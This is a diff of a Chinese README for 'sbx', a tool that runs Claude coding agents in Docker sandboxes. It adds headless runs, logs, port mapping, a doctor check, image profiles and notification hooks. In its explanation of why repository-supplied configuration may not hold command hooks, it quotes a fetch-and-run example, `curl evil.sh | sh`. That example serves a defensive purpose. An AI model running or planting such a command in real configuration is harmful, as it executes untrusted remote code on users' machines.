@@ -94,8 +94,29 @@ git branch -D sbx/fix-login
 | `--fresh` | 重新拉起时开一段新对话（默认接上这个 Task 的上次对话） |
 | `--net open\|allowlist` | 只影响本次，不写配置 |
 | `--proxy shared\|dedicated` | 只影响本次，不写配置；Task 建好之后换不了（见下文） |
+| `-p, --prompt <text>` | headless：跑完这段 prompt 就结束，不进会话（`-p -` 从 stdin 读） |
 
 `--base` 用在从某个历史提交或另一分支起步：`sbx run hotfix --base v1.2.0`。分支已存在时，`ls` 里的 AHEAD/DIFF 基准自动取它和 HEAD 的分叉点（merge-base）。
+
+### 无人值守：`sbx run -p` 和 `sbx logs`（M3-7）
+
+```bash
+sbx run nightly -p "把 CI 里失败的那几个测试修好，每修一个提交一次"
+sbx run nightly -p - < prompt.md        # 长 prompt 从文件来
+sbx run nightly -p "..." --detach       # 不等它，回头 sbx logs -f 看
+sbx logs nightly                        # 看完整输出
+sbx logs nightly -f -n 50               # 跟着看，先打最后 50 行
+```
+
+`-p` 和交互模式的区别只有两点：**不进 tmux**，以及**跑完容器自己停掉**。
+
+- 前台跑时 sbx 跟着 `run.log` 打印直到结束，并用 claude 的退出码退出——所以 `sbx run t -p "..." && git merge sbx/t` 这种写法是成立的。
+- **跑完容器会停**：整夜铺十个任务时，跑完一个就释放一份内存和一个 `max_running` 名额。想进去看现场就 `sbx run <task>` 把它起回来，worktree、分支、`run.log` 都还在。
+- `sbx ls` 显示 `exited(0)`（或非 0 的码）。注意这是 **claude 的**退出码，不是容器的。
+- 输出在 `~/.sbx/state/<ws>/<task>/run.log`，追加写，每轮前面有一行时间分隔头，超过 10MB 轮转成 `run.log.1`。`sbx logs` 读的就是这个文件，**所以容器停了照样看得到**。
+- 默认接上这个 Task 的上次对话（和交互模式一样），`--fresh` 才新开一段。连续 `-p` 可以一轮一轮往下推。
+- 它仍然跑在 tmux 里，所以**跑的过程中可以 `sbx attach` 进去围观**。
+- 一个 Task 里已经有会话在跑时，`-p` 会被**直接拒绝**，不会插队——两个 claude 抢同一棵 worktree 只会互相踩。
 
 ### `sbx done <task>...`
 
@@ -190,8 +211,14 @@ cd "$(sbx path fix-login)"
 | `BRANCH` | `sbx/<task>`，main Task 显示 `(repo root)` |
 | `AHEAD` | 相对 base 的提交数。**`0` 意味着 Agent 还没提交过任何东西** |
 | `DIFF` | `3f +10 -2` = 3 个文件、+10 行、-2 行（相对 base 的三点 diff） |
+| `DENIED` | 这个 Task 被代理拦掉的请求数（只数"不在白名单"那一类）。`-` 表示这次没统计到（代理没在跑） |
 | `LAST-ACTIVE` | hooks 最后一次写状态的时间 |
 | `PATH` | worktree 路径（`~` 缩写） |
+
+```bash
+sbx ls --all          # 列出所有 Workspace 的 Task，多一列 WORKSPACE；不要求你在某个仓库里
+sbx ls --no-denied    # 跳过 DENIED 列（它要读一次代理的 access.log）
+```
 
 STATUS 由容器状态和 claude hooks 写的 `status.json` 共同推导：
 
@@ -203,6 +230,7 @@ STATUS 由容器状态和 claude hooks 写的 `status.json` 共同推导：
 | `starting` | 容器在跑，但还没收到第一个 hook |
 | `running` | Agent 正在干活（`UserPromptSubmit` / `PreToolUse`） |
 | `idle` | Agent 停下了：可能干完了，**也可能在等你回话**（`Notification`） |
+| `exited(0)` | headless 跑完了（`sbx run -p`），这是 claude 的退出码 |
 | `exited(agent)` | 容器还在，claude 退了，会话里是 shell。`sbx run` 可重新拉起 |
 
 > **`idle` 是最需要你亲自看一眼的状态。** 它不区分"任务完成"和"Agent 在问你要不要继续"。配合 `AHEAD 0` 基本可以断定它停在要人确认上 —— attach 进去看最后一句话。
@@ -263,6 +291,9 @@ sbx run t1 --proxy dedicated   # 本次用独占的代理 sidecar
 ## 第 6 层：维护
 
 ```bash
+sbx doctor            # 一次体检：docker、代理、登录、信任、通知、首次启动状态
+sbx port t1 3000      # 把容器里的端口拿到 127.0.0.1 上
+sbx drop t1           # 结束 Task 并删掉分支（要确认）
 sbx memory pull       # 把沙箱里新记的项目记忆导回宿主机
 sbx memory pull -y    # 不询问直接写
 sbx upgrade           # 升级沙箱里的 claude
@@ -316,6 +347,15 @@ sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
 | | `--net open\|allowlist` | 跟随配置 |
 | | `--proxy shared\|dedicated` | 跟随配置 |
 | | `--cloud-mcp` | false（云端 MCP 被拦；只能开不能关） |
+| | `-p, --prompt <text>` | 空（交互模式）；`-` 读 stdin |
+| `logs <task>` | `-f, --follow` | false |
+| | `-n, --tail <行数>` | 0（全部），`-f` 时默认 20 |
+| `ls` | `--all` | false（只看当前仓库） |
+| | `--no-denied` | false |
+| `drop <task>` | `--force` / `-y, --yes` | false |
+| `port <task> [port]` | `--rm` | false（省略 port 时收回全部） |
+| `doctor` | `--quick` | false（跳过慢的冒烟检查） |
+| | `--strict` | false（警告也算失败） |
 | `done <task>...` | `--force` | false（脏就报错） |
 | `net denied [task]` | `--all` | false（只看"不在白名单"） |
 | | `--since <dur>` | 0（全部），例如 `2h`、`30m` |
@@ -328,6 +368,51 @@ sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
 | | `-y, --yes` | false（先问） |
 | `config show` | 无 | |
 | `attach/shell/stop/ls/path/upgrade` | 无 | |
+
+---
+
+## 用哪个镜像：Profile 和自定义（M3-1/2/3、design §5.2）
+
+```toml
+profile = "web-go"     # 内置：web-go（Go + Node + Python）| py-rust（uv + rustup）
+# image = "ghcr.io/me/devbox:2026-10"   # 直接用现成镜像，覆盖 profile
+```
+
+优先级：**配置里的 `image` > `<repo>/.sbx/Dockerfile` > `profile`**。
+
+- `<repo>/.sbx/Dockerfile` 存在就直接用它当底，不用写任何配置。它在 `.sbx/` 下，所以**信任确认天然管着它**——别人往里塞东西，你下次 `sbx run` 会看到 diff。
+- 底层镜像必须是 **Debian/Ubuntu 系**（Agent 层要用 apt-get 和 useradd）。不是的话 sbx 会明确报错，而不是在构建中途以难懂的方式失败。
+- **不需要自带 Node**：claude 是 npm 包，Agent 层发现底层没有 npm 会自己装。
+- 装在 `/usr/local/<x>/bin` 里的工具记得软链到 `/usr/local/bin`：tmux 和 `bash -l` 是 login shell，`/etc/profile` 会重置 PATH。
+
+**语言运行时按项目走（mise）**：worktree 里有 `.tool-versions`、`mise.toml`、`.nvmrc`、`.python-version`、`rust-toolchain.toml` 时，`sbx run` 会在容器里跑一次 `mise install`，装到全局共享的 `sbx-mise` volume 里——**第二个用同样版本的 Task 直接复用**（实测 51s → 2.8s）。装不上只警告，不挡住 Task 启动。
+
+**依赖遮盖的默认值跟着 Profile 走**：web-go 是 `node_modules`、`.next`，py-rust 是 `.venv`、`target`。自己写 `deps.mask` 时是**追加**，不是替换。
+
+---
+
+## 把容器里的端口拿出来：`sbx port`（M3-11）
+
+```bash
+sbx port fix-login 3000     # → http://127.0.0.1:54321/
+sbx port fix-login          # 列出这个 Task 映射过的端口
+sbx port fix-login 3000 --rm
+```
+
+映射是**一个独立的 socat 转发容器**，不碰 Task 本身——重建 agent 容器会把正在跑的会话杀掉，这在无人值守时不可接受。所以端口随时可以来去，`sbx done` 时会连同它一起清掉。
+
+**只绑 `127.0.0.1`**，宿主机端口由 docker 随机分配，所以多个 Task 开同一个端口也不会撞车。
+
+---
+
+## 连分支一起删：`sbx drop`（M3-12）
+
+```bash
+sbx drop spike      # 要求你输入 Task 名确认
+sbx drop spike -y   # 脚本里用
+```
+
+`done` 做的事它全做，外加删掉 `sbx/<task>` 分支。确认提示会告诉你**有多少个提交会一起没掉**——容器和 worktree 都能重建，commit 删了就真没了，这是整套工具里唯一不可逆的操作。
 
 ---
 
@@ -365,14 +450,17 @@ resources.memory       "6g"                                      工作区
 
 校验在**四层合并完之后**才做：被后面的层盖掉的非法值不报错；真报错时会告诉你这个值是哪一层给的。
 
-### 项目层的两条红线（M2-2）
+### 项目层的三条红线（M2-2、M3-10）
 
-`<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面两类内容会**直接报错**，不是警告：
+`<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面三类内容会**直接报错**，不是警告：
 
-- **密钥类字段**：键名里含 `key`、`token`、`secret`、`password`、`credential`（`api_key_file` 这种"指明凭据从哪来"的也算）。检查对未知字段同样生效，不认识的键不能绕过去。
+- **密钥类字段**：键名里含 `key`、`token`、`secret`、`password`、`credential`（`api_key_file` 这种"指明凭据从哪来"的也算）。
 - **绝对路径**：值以 `/`、`~/` 或 `C:\` 开头。
+- **会在容器里执行的命令**：键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook`，比如 `on_idle`、`on_exit`。
 
-这两类只能写在全局层或工作区层——也就是只能你自己写在自己机器上。
+这三类只能写在全局层或工作区层——也就是只能你自己写在自己机器上。检查对未知字段同样生效，不认识的键不能绕过去。
+
+> 第三条是 M3-10 加的。`on_idle = "curl evil.sh | sh"` 既不像密钥也不是绝对路径，前两条红线都拦不住它；而信任确认虽然会把 `.sbx/` 的改动摊开给你看，但不该指望每个人每次都逐行读懂一段 shell。
 
 未知字段只警告不报错。
 
@@ -411,7 +499,8 @@ sbx trust -y       # 不询问直接记下
 - `sbx net allow --project` 写完 `.sbx/sandbox.toml` 会顺手更新信任记录——这次改动是你让 sbx 做的。但**仅限写之前本来就是已信任状态**，否则会把别人留下的、你还没看过的改动一起放行。
 
 ```toml
-profile       = "web-go"      # 内置 Profile，目前只有这一个
+profile       = "web-go"      # 内置 Profile：web-go | py-rust
+# image       = "..."         # 直接用现成镜像，覆盖 profile（M3-2）
 default_agent = "claude"
 max_running   = 3             # 同时运行的 Task 上限，跨 Workspace 计数
 
@@ -426,6 +515,11 @@ allow     = []                # 追加到内置白名单，只在 allowlist 模�
 cpus   = 2
 memory = "3g"                 # 形如 3g / 512m
 pids   = 1024
+
+# 通知（M3-10）：在容器里执行，只能写在全局层或工作区层
+# on_idle = "curl -s https://hooks.example.com/idle?task=$SBX_TASK"
+# on_exit = "curl -s https://hooks.example.com/exit?task=$SBX_TASK&code=$SBX_EXIT_CODE"
+# notify_throttle = 600       # 两次同类通知的最小间隔（秒）
 
 [deps]
 mask = ["node_modules"]       # 每一项在容器里挂一个独立 volume 遮住，避免污染宿主机
@@ -485,6 +579,63 @@ cloud_mcp = true                 # 一直打开
 
 ---
 
+## 跑完告诉我一声：`on_idle` / `on_exit`（M3-10、design §7.2）
+
+```toml
+# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
+on_idle = "curl -s -X POST https://open.feishu.cn/open-apis/bot/v2/hook/xxx --data-raw \"{\\\"msg_type\\\":\\\"text\\\",\\\"content\\\":{\\\"text\\\":\\\"$SBX_TASK 停下来了\\\"}}\""
+on_exit = "curl -s -X POST https://.../hook -d \"task=$SBX_TASK&code=$SBX_EXIT_CODE\""
+notify_throttle = 600   # 两次同类通知的最小间隔（秒），默认 600
+```
+
+命令**在容器里执行**，sbx 没有宿主机守护进程，也不内置任何系统通知。
+
+| 挂在哪 | 什么时候 |
+|---|---|
+| `on_idle` | `Notification` 事件：Agent 空闲约 60 秒，通常意味着它在等你回话。**不挂 Stop**——短暂停顿也发通知会很吵 |
+| `on_exit` | claude 退出时（`SessionEnd`）。headless 下由包装脚本在容器停掉之前同步发，所以拿得到退出码 |
+
+命令里能用的变量：`SBX_WS`、`SBX_TASK`、`SBX_EVENT`（idle/exit）、`SBX_STATE`、`SBX_TS`，以及 headless 的 `SBX_EXIT_CODE`。
+
+> **注意引号**：`$SBX_TASK` 写在 shell 的**单引号**里不会被展开，webhook 收到的会是字面量 `$SBX_TASK`。sbx 不做任何变量替换（那会把 JSON 的转义搞乱），所以要展开就用双引号。`sbx doctor` 会检查这一点并提醒你。
+
+几条保证：
+
+- **通知永远不会卡住 Agent**：20 秒超时，交互模式下放后台跑，无论成败都返回 0。失败只记进 `~/.sbx/state/<ws>/<task>/notify.log`。
+- **节流**：同一类通知在窗口内只发一次。`Notification` 是反复触发的事件。
+- **webhook 的主机自动放行**：sbx 从命令里扫出 `http(s)://` 的主机名，作为"通知域名"层加进该 Task 的白名单，allowlist 模式下不用你再 `net allow`。主机名里有变量、或者写的是 IP 时扫不出来，`sbx run` 会提示你手动放行。
+- **容器被 OOM 杀掉时收不到通知**：那种情况下 hooks 根本来不及跑，只能靠 `sbx ls` 的 `exited(oom)` 事后发现。
+- 这两个键**不能写在项目层**（`<repo>/.sbx/sandbox.toml`），见下面的红线。
+
+---
+
+## 体检：`sbx doctor`（M3-13）
+
+```console
+$ sbx doctor
+  ✓ docker      Docker 27.4.0，VM 内存 9.7g
+  ✓ vm-memory   max_running(3) × 3g = 9.0g ≤ VM 内存 9.7g 的 95%
+  ✓ upstream    http://host.docker.internal:7890 可用
+  ✗ sbx-proxy   已停止，但有 1 个 shared Task 在跑（它们现在出不了网）
+      → docker rm -f sbx-proxy 之后重新 sbx run
+  ✓ login       已登录：you@example.com · team · claude.ai
+  ! trust       .sbx/ 自上次确认后有变化
+      → sbx trust
+  ✓ notify      open.feishu.cn 已自动加入白名单
+  ✓ smoke       运行中的 sbx-shop-e76272-fix 画面正常，没有卡在对话框上
+
+1 项警告，1 项失败
+```
+
+八项检查：docker 可用性、VM 内存够不够（R10）、上游代理连通性、`sbx-proxy` 健康（R8）、登录态、信任状态、通知配置、首次启动冒烟（R9：claude 的内部状态字段随版本变化，卡在对话框上会让无人值守直接失效）。
+
+- **只有 `✗` 才让 `sbx doctor` 非 0 退出**。`!` 的意思是"能用，但该改"——要是它也让命令失败，写进脚本的人就只能加 `|| true`，那警告就白给了。`--strict` 下警告也算失败。
+- `--quick` 跳过慢的那项（冒烟检查）。
+- 冒烟优先用现成的：有 Task 在跑就抓它的 tmux 画面，没有就跳过（`sbx run` 每次启动本来就会做这项检查）。
+- **不要求你在 git 仓库里**。信任状态这类和仓库有关的项，不在仓库里时标成跳过。
+
+---
+
 ## 并发与内存（M2-14、design §11、R10）
 
 `sbx run` 在真要启动一个容器之前查两件事：
@@ -520,8 +671,11 @@ VM 内存取自 `docker info` 的 `MemTotal`，Docker Desktop 下就是那台 VM
 | `SBX_HOST_CLAUDE` | 宿主机 `~/.claude` 的位置，影响记忆导入导出 |
 | `TZ` | 有则直接用，否则读 `/etc/localtime` 的软链；注入容器，让 Agent 的日志和提交时间跟你一致 |
 
+容器里的 Agent 和通知命令能看到：`SBX_WS`、`SBX_TASK`，以及通知命令额外拿到的 `SBX_EVENT`、`SBX_STATE`、`SBX_TS`、`SBX_EXIT_CODE`（headless）。
+
 ## 当前的边界
 
 - **没有 `sbx merge`**，合并永远是你在主仓库手动做；分支有 commit 没合并时 `done` 不会提醒。
 - 上游代理只支持 http；只有 SOCKS 的宿主机代理需要你自己加一层转发（design §6.4）。
-- `sbx ls` 的 CJK 列宽对不齐（tabwriter 按字节算宽度）。
+- **Codex 还没接**（M3-6）：`--agent codex` 和 `default_agent = "codex"` 目前会明确报错。
+- 底层镜像必须是 Debian/Ubuntu 系（ADR 0007）。
